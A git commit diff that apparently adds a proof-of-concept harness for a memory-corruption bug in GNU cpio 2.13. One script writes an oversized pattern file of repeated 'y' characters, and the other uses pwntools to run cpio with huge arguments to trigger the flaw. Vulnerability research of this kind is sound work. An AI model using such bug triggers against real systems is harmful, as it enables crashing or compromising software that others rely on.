4758ddd62b0c3af649e0081e52e109562c73dc5c
Maverick Chung <mc608@duke.edu>
2021-07-24 19:23:40 -0400

    added script

--- make_pattern.py
+++ make_pattern.py
@@ -1,7 +1,16 @@
 #!/usr/bin/env python3
 
+import sys
+
+if len(sys.argv) < 2:
+    print("Usage: ./make_pattern.py [pattern_size]")
+    print(f"Smallest to make max chunk size is {1090519038//2+1}.")
+    exit()
+else:
+    p = int(sys.argv[1])
+
 file = open("patt", "w")
-longstr = "y"*(1090519038//2+1)
+longstr = "y"*p
 
 file.write(longstr)
 file.write("\n")
--- x.py
+++ x.py
@@ -4,12 +4,15 @@ from pwn import *
 
 PATTERN_FILE = "./patt"
 CPIO_BINARY = "./cpio-2.13/src/cpio"
+BLOCK_SIZE = 1<<20
+NUM_PATTERNS = 20000
 
-cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} --block-size={1<<20} " + "y "*20000
+cmd = f"{CPIO_BINARY} -iv -E {PATTERN_FILE} -r --block-size={BLOCK_SIZE} " + "y "*(NUM_PATTERNS-1)
 
 p = process(cmd.split())
 out = p.recvuntil("New pattern")
 print(out.decode(), end='')
 print(p.recv().decode())
+# p.interactive()
 p.close()
 exit()
